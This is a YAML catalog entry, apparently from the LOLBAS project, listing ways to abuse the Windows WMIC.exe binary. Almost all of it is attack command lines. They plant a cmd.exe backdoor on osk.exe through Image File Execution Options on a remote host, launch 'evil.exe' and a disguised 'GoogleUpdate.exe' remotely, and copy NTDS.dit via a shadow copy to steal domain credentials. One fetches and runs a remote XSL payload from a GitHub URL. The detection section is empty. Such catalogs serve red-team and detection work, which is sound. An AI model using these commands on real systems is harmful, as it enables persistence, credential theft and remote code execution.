---
Name: WMIC.exe
Description: Reconnaissance, Execute, Read ADS
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: wmic process call create calc
    Description: ''
  - Command: "wmic process call create '\"c:\\ads\\file.txt:program.exe\"'\n   \n\
      wmic useraccount get /ALL    \n    \nwmic process get caption,executablepath,commandline\
      \     \n    \nwmic qfe get description,installedOn /format:csv    \n    \nwmic\
      \ /node:\"192.168.0.1\" service where (caption like \"%sql server (%\")    \n\
      \    \nget-wmiobject –class \"win32_share\" –namespace \"root\\CIMV2\" –computer\
      \ \"targetname\"    \n    \nwmic /user:<username> /password:<password> /node:<computer_name>\
      \ process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\\
      Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\
      \" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"    \n    \nwmic /NODE:\
      \ \"192.168.0.1\" process call create \"evil.exe\"    \n    \nwmic /node:REMOTECOMPUTERNAME\
      \ PROCESS call create \"at 9:00PM c:\\GoogleUpdate.exe ^> c:\\notGoogleUpdateResults.txt\"\
      \    \n    \nwmic /node:REMOTECOMPUTERNAME PROCESS call create \"cmd /c vssadmin\
      \ create shadow /for=C:\\Windows\\NTDS\\NTDS.dit > c:\\not_the_NTDS.dit\"  \
      \  \n     \nwmic process get brief /format:\"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl\"\
      \    \n     \nwmic os get /format:\"MYXSLFILE.xsl\"    \n     \nwmic process\
      \ get brief /format:\"\\\\127.0.0.1\\c$\\Tools\\pocremote.xsl\""
    Description: ''
Full Path:
  - c:\windows\system32\wbem\wmic.exe
  - c:\windows\sysWOW64\wbem\wmic.exe
Code Sample: []
Detection: []
Resources:
  - https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory
  - https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html
  - https://twitter.com/subTee/status/986234811944648707
Notes: Thanks to Casey Smith - @subtee
---